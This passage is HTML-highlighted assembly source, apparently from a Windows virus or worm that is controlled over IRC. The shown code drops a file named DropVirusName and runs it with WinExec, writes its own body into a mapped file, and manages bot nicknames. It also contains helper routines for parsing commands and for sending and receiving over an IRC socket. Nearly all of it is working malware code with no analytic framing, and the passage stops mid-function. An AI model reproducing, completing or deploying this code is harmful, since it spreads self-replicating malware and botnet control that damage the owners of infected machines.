        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">DropVirusName</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">GENERIC_WRITE</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">CREATE_NEW</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">MyOpenFile</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">DontDropFile</span><span class="sc0">

        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">WriteFile</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Temp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">CloseHandle</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">WinExec</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">DropVirusName</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">SW_SHOW</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc10">Error</span><span class="sc0">

   </span><span class="sc5">DontDropFile</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+((</span><span class="sc5">s_Userinfo</span><span class="sc4">+</span><span class="sc2">40</span><span class="sc4">)-</span><span class="sc5">s_Header</span><span class="sc4">+</span><span class="sc2">400h</span><span class="sc4">)]</span><span class="sc0">
        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">Random</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">ChangeLeader</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0">

   </span><span class="sc5">ChangeLeader</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">MyNick</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc10">Error</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">

        </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">GetFileSize</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">WriteFile</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">FileHandle</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Temp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">UnmapViewOfFile</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">CloseHandle</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">CloseHandle</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">CloseHandle</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">FileHandle</span><span class="sc0">

  </span><span class="sc5">DroppedNewVirus</span><span class="sc4">:</span><span class="sc0">


        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">MyNick</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">DontNeedToGenerateNewNick</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GenerateNewNick</span><span class="sc0">

  </span><span class="sc5">DontNeedToGenerateNewNick</span><span class="sc4">:</span><span class="sc0">  
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">SetupProgram</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">


        



</span><span class="sc5">FindReplacement</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc5">DollarCommand</span><span class="sc4">:</span><span class="sc10">dword</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">DollarCommand</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">TemporaryBuffert</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'$'</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc10">Error</span><span class="sc0">

        </span><span class="sc6">lodsb</span><span class="sc0">

        </span><span class="sc9">.if</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">&gt;=</span><span class="sc12">'0'</span><span class="sc0"> </span><span class="sc4">&amp;&amp;</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">&lt;=</span><span class="sc12">'9'</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'0'</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">Buffs</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0">


        </span><span class="sc9">.else</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
            </span><span class="sc5">GetStringToDisplace</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">IsCharAlphaNumeric</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">SeekForDisplacement</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">lodsb</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">GetStringToDisplace</span><span class="sc0">

            </span><span class="sc5">SeekForDisplacement</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">DollarCommand</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                 </span><span class="sc1">; edi -&gt; $ string</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">DollarReplacements</span><span class="sc0">  </span><span class="sc1">; esi -&gt; list of $ strings</span><span class="sc0">

            </span><span class="sc5">SeekForReplacement</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">lstrlenInc</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">StringCmp</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">FoundString</span><span class="sc0">

            </span><span class="sc5">DidntFind</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">SeekForReplacement</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">DollarCommand</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">ReturnFindReplacement</span><span class="sc0">

          </span><span class="sc5">FoundString</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; esi -&gt; -&gt; String</span><span class="sc0">
        </span><span class="sc9">.endif</span><span class="sc0">

    </span><span class="sc5">ReturnFindReplacement</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc5">ReturnNoDollar</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">                       </span><span class="sc1">; eax -&gt; String</span><span class="sc0">

        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">lstrcpy</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">TemporaryBuffert</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">                             </span><span class="sc1">; ptr to ptr to string</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">                             </span><span class="sc1">; length of $ command</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">FindReplacement</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">




</span><span class="sc1">; sets carry flag if not found</span><span class="sc0">
</span><span class="sc5">IsInMessage</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc5">StringToSearchIn</span><span class="sc4">:</span><span class="sc10">dword</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">SearchString</span><span class="sc4">:</span><span class="sc10">dword</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">                             </span><span class="sc1">; save registers</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">                             </span><span class="sc1">; ebx, esi, edi should never</span><span class="sc0">
                                                </span><span class="sc1">; be changed in a function</span><span class="sc0">

        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">lstrlen</span><span class="sc4">,</span><span class="sc5">SearchString</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">lstrlen</span><span class="sc4">,</span><span class="sc5">StringToSearchIn</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">NotFound</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">StringToSearchIn</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">SearchString</span><span class="sc0">

      </span><span class="sc5">ScanLoop</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">repz</span><span class="sc0">    </span><span class="sc6">cmpsb</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">FoundString</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">NotFound</span><span class="sc0">                        </span><span class="sc1">; jnz ScanLoop, but faster</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">ScanLoop</span><span class="sc0">                        </span><span class="sc1">; on pentiums</span><span class="sc0">

     </span><span class="sc5">NotFound</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">StringToSearchIn</span><span class="sc0">
        </span><span class="sc6">stc</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

     </span><span class="sc5">FoundString</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">clc</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">IsInMessage</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc5">SplitStringAtSpace</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc5">Message</span><span class="sc4">:</span><span class="sc10">dword</span><span class="sc0">
        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">IsInMessage</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Message</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Space</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">NoSpaceInString</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc5">NoSpaceInString</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">SplitStringAtSpace</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc5">CreateString</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc5">ToString</span><span class="sc4">:</span><span class="sc10">dword</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">FromString</span><span class="sc4">:</span><span class="sc10">dword</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">FromString</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">ToString</span><span class="sc0">

     </span><span class="sc5">CreateStringLoop</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">

        </span><span class="sc9">.if</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">==</span><span class="sc3">"$"</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">FindReplacement</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                 </span><span class="sc1">; string length returned in</span><span class="sc0">
                                                </span><span class="sc1">; ecx, wont work in HLL</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">; copy from</span><span class="sc0">
                </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">lstrlen</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">                     </span><span class="sc1">; copy to</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">lstrcpy</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc9">.elseif</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">!</span><span class="sc4">=</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc9">.else</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">StringCreated</span><span class="sc0">
        </span><span class="sc9">.endif</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">CreateStringLoop</span><span class="sc0">
     
     </span><span class="sc5">StringCreated</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">CreateString</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc5">SendMsg</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc5">Message</span><span class="sc4">:</span><span class="sc10">dword</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1000</span><span class="sc0">
        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">LocalAlloc</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">LMEM_ZEROINIT</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">Message</span><span class="sc0">

        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">CreateString</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc5">CRLF</span><span class="sc0">        
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">WriteFile</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">DebugFilePtr</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">  </span><span class="sc1">; for debugging</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">

        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">send</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">SocketPtr</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">; send string to irc server</span><span class="sc0">
        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">LocalFree</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                  
        
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">SendMsg</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">GetMsg</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc5">WriteBuffert</span><span class="sc4">:</span><span class="sc10">dword</span><span class="sc0">
</span><span class="sc5">GetMsgStart</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">IsInMessage</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">InBuffertPtr</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">LF</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">EnoughData</span><span class="sc0">

        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">lstrlen</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">InBuffertPtr</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">lstrcpyn</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">BuffertPtr</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">InBuffertPtr</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">                         </span><span class="sc1">; eax -&gt; Zerospace</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">498</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">                         </span><span class="sc1">; how much to read</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">recv</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">SocketPtr</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc10">Error</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc10">Error</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
